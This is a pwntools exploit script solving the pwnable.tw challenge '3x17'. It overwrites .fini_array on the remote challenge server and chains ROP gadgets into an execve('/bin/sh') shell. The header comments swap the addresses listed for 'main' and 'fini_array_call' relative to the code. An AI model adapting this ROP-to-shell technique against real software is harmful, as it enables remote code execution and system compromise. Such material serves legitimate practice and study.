# rax: 0x000000000041e4af
# rdi: 0x0000000000401696
# rsi: 0x0000000000406c30
# rdx: 0x0000000000446e35
# syscall: 0x00000000004022b4
# leave_ret: 0x0000000000401c4b
# fini_array: 004b40f0
# fini_array_call: 00401b6d
# main: 00402960
from pwn import *

# r = process('./3x17')
r = remote('chall.pwnable.tw', 10105)

rax = 0x000000000041e4af
rdi= 0x0000000000401696
rsi= 0x0000000000406c30
rdx= 0x0000000000446e35
syscall = 0x00000000004022b4
leave_ret = 0x0000000000401c4b
fini_array = 0x004b40f0
fini_array_call =  0x00402960
main =0x00401b6d
shell_address = fini_array + 8*11

def write(addr, data):
    r.sendafter(b'addr:', str(addr).encode() + b'\n')
    r.sendafter(b'data:', str(data).encode() + b'\n')

write(fini_array, p64(fini_array_call)+p64(main))
write(fini_array + 8*2, p64(rdi) + p64(shell_address))
write(fini_array + 4 * 8, p64(rsi)+p64(0))
write(fini_array+8*6, p64(rdx)+p64(0))
write(fini_array+8*8, p64(rax)+p64(0x3b))
write(fini_array+8*10, p64(syscall) + '/bin/sh\x00')
write(fini_array, p64(leave_ret))
r.interactive()